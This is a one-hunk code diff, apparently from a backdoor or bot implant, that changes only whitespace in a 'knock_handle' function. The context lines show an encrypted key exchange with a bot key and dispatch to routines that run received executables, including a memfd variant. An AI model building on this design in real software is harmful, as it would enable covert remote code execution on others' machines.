@@ -69,7 +69,7 @@ void knock_handle(int sock){
         ed25519_key_exchange(secret, public_key, bot_private_key);
 
         xdata(secret, header, 32);
-
+        
         if ((memcmp(header,DEGU_EXE_UL,4) == 0) || 
             (memcmp(header,DEGU_EXE_MEMFD,4) == 0 ) ){
             knock_handle_exe(sock, header, secret);
